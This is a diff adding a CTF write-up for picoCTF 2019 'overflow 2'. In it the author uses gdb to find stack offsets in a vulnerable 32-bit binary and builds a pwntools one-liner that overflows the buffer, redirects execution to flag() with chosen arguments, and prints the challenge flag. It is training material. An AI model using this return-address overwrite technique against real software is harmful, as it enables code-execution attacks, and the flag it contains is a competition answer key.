@@ -59,4 +59,139 @@ int main(int argc, char **argv){
   vuln();
   return 0;
 }
-</code></pre></main><nav class=nav-wrapper aria-label="Page navigation"><a rel=prev href=../../ctf/binary/picoctf19-overflow_1.html class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a rel=next href=../../ctf/crypto/index.html class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a><div style=clear:both></div></nav></div></div><nav class=nav-wide-wrapper aria-label="Page navigation"><a href=../../ctf/binary/picoctf19-overflow_1.html class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a href=../../ctf/crypto/index.html class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a></nav></div><script>window.playpen_copyable=true;</script><script src=../../elasticlunr.min.js></script><script src=../../mark.min.js></script><script src=../../searcher.js></script><script src=../../clipboard.min.js></script><script src=../../highlight.js></script><script src=../../book.js></script><script src=../../theme/mermaid.js></script>
+</code></pre><p>It seems like a program that takes in some input and prints it back to you. Let's try that and some large input.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ ./vuln
+Please enter your string: 
+A
+A
+samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ echo $(python -c &quot;print 'A'*184&quot;) | ./vuln
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault (core dumped)
+</code></pre><p>We need to invoke the <code>flag()</code> function like <code>flag(0xDEADBEEF, 0xC0DED00D)</code> from <code>vuln()</code><p>The hint suggests to look at the stack, so let's do that.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ gdb ./vuln
+... &lt;redacted&gt;
+Reading symbols from ./vuln...(no debugging symbols found)...done.
+(gdb) r
+Starting program: /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446/vuln 
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0804872a in main ()
+(gdb) info frame
+Stack level 0, frame at 0x1:
+ eip = 0x804872a in main; saved eip = &lt;not saved&gt;
+ Outermost frame: Cannot access memory at address 0xfffffffd
+ Arglist at 0x41414141, args: 
+ Locals at 0x41414141, Previous frame's sp is 0x1
+Cannot access memory at address 0xfffffffd
+</code></pre><p>Notice how the <code>Arglist</code> is at <code>0x41414141</code>. Those are the <code>A</code>'s we passed in. So let's try a different string and see if we can figure out where in the list to enter our address and arguments.<p>Let's try 176 <code>A</code>'s followed by the rest of the alphabet to see what ends up at the arg list.<p><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ</code><pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ gdb ./vuln
+... &lt;redacted&gt;
+Reading symbols from ./vuln...(no debugging symbols found)...done.
+(gdb) r
+Starting program: /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446/vuln 
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+
+Program received signal SIGSEGV, Segmentation fault.
+0x45454545 in ?? ()
+(gdb) bt
+#0  0x45454545 in ?? ()
+#1  0x46464646 in ?? ()
+#2  0x47474747 in ?? ()
+#3  0x48484848 in ?? ()
+#4  0x49494949 in ?? ()
+#5  0x4a4a4a4a in ?? ()
+#6  0x4b4b4b4b in ?? ()
+#7  0x4c4c4c4c in ?? ()
+#8  0x4d4d4d4d in ?? ()
+#9  0x4e4e4e4e in ?? ()
+#10 0x4f4f4f4f in ?? ()
+#11 0x50505050 in ?? ()
+#12 0x51515151 in ?? ()
+#13 0x52525252 in ?? ()
+#14 0x53535353 in ?? ()
+#15 0x54545454 in ?? ()
+#16 0x55555555 in ?? ()
+#17 0x56565656 in ?? ()
+#18 0x57575757 in ?? ()
+#19 0x58585858 in ?? ()
+#20 0x59595959 in ?? ()
+#21 0x5a5a5a5a in ?? ()
+#22 0x00000000 in ?? ()
+(gdb) info frame
+Stack level 0, frame at 0xffada8e4:
+ eip = 0x45454545; saved eip = 0x46464646
+ called by frame at 0xffada8e8
+ Arglist at 0xffada8dc, args: 
+ Locals at 0xffada8dc, Previous frame's sp is 0xffada8e4
+ Saved registers:
+  eip at 0xffada8e0
+</code></pre><pre><code class=language-bash>(gdb) disas flag
+Dump of assembler code for function flag:
+   0x080485e6 &lt;+0&gt;:     push   %ebp
+... &lt;redacted&gt;
+   0x0804864a &lt;+100&gt;:   cmpl   $0xdeadbeef,0x8(%ebp)
+   0x08048651 &lt;+107&gt;:   jne    0x804866d &lt;flag+135&gt;
+   0x08048653 &lt;+109&gt;:   cmpl   $0xc0ded00d,0xc(%ebp)
+   0x0804865a &lt;+116&gt;:   jne    0x8048670 &lt;flag+138&gt;
+... &lt;redacted&gt;
+   0x08048675 &lt;+143&gt;:   ret    
+End of assembler dump.
+</code></pre><p>Intersting, we saw that it stopped at <code>0x45454545</code> which are the <code>DDDD</code>. So now we have 176 <code>A</code>'s, 12 bytes, <code>FLAG_ADDRESS</code>. So we could use:<pre><code class=language-bash>python -c &quot;from pwn import *; print 'A'*176+'B'*12+p32(0x080485e6)&quot; | ./vuln
+</code></pre><p>Now the arguments <code>arg1</code> and <code>arg2</code> won't be far past the <code>FLAG_ADDRESS</code>. Let's determine where it needs to go.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ python -c &quot;from pwn import *; print 'A'*176+'B'*12+p32(0x080485E6)+'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH'&quot; &gt; /tmp/in
+samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ gdb ./vuln
+... &lt;redacted&gt;
+Reading symbols from ./vuln...(no debugging symbols found)...done.
+(gdb) r &lt; /tmp/in
+Starting program: /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446/vuln &lt; /tmp/in
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
+Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.
+[Inferior 1 (process 2734491) exited normally]
+</code></pre><p>The program doesn't work because gdb isn't running under the same permissions. I'll copy the files over to another directory and attempt it<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ mkdir /tmp/s5
+samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ cp vuln /tmp/s5/vuln
+samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ vi /tmp/s5/flag.txt
+samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ cat /tmp/s5/flag.txt
+SAMCTF{123123123123123}
+samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ pushd . &amp;&amp; cd /tmp/s5
+samson@pico-2019-shell1:/tmp/s5$ gdb ./vuln
+... &lt;redacted&gt;
+Reading symbols from ./vuln...(no debugging symbols found)...done.
+(gdb) b *flag
+Breakpoint 1 at 0x80485e6
+(gdb) b *flag+97
+Breakpoint 2 at 0x8048647
+(gdb) r &lt; /tmp/in
+Starting program: /tmp/s5/vuln &lt; /tmp/in
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
+
+Breakpoint 1, 0x080485e6 in flag ()
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048647 in flag ()
+(gdb) info stack
+#0  0x08048647 in flag ()
+#1  0x41414141 in ?? ()
+#2  0x42424242 in ?? ()
+#3  0x43434343 in ?? ()
+#4  0x44444444 in ?? ()
+#5  0x45454545 in ?? ()
+#6  0x46464646 in ?? ()
+#7  0x47474747 in ?? ()
+#8  0x48484848 in ?? ()
+#9  0xf7fbe000 in ?? () from /lib32/libc.so.6
+Backtrace stopped: previous frame inner to this frame (corrupt stack?)
+(gdb) x $ebp
+0xffffd5ac:     0x42424242
+</code></pre><p>There it is. <code>ebp</code> is the first argument and from this <a href=https://stackoverflow.com/questions/42771550/why-does-first-parameter-in-x86-assembly-starts-from-offset-8>stackoverflow post</a>
+We know the arguments are just 4 places off the flag adddress.<pre><code class=language-bash>samson@pico-2019-shell1:/tmp/s5$ popd
+/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446
+samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ python -c &quot;from pwn import *; print 'A'*176+'B'*12+p32(0x080485E6)+'A'*4+p32(0xDEADBEEF)+p32(0xC0DED00D)&quot; | ./vuln 
+Please enter your string: 
+���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
+picoCTF{arg5_and_r3turn51b106031}Segmentation fault (core dumped)
+</code></pre><h2><a class=header href=#flag id=flag>Flag</a></h2><p>picoCTF{arg5_and_r3turn51b106031}</main><nav class=nav-wrapper aria-label="Page navigation"><a rel=prev href=../../ctf/binary/picoctf19-overflow_1.html class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a rel=next href=../../ctf/crypto/index.html class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a><div style=clear:both></div></nav></div></div><nav class=nav-wide-wrapper aria-label="Page navigation"><a href=../../ctf/binary/picoctf19-overflow_1.html class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a href=../../ctf/crypto/index.html class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a></nav></div><script>window.playpen_copyable=true;</script><script src=../../elasticlunr.min.js></script><script src=../../mark.min.js></script><script src=../../searcher.js></script><script src=../../clipboard.min.js></script><script src=../../highlight.js></script><script src=../../book.js></script><script src=../../theme/mermaid.js></script>
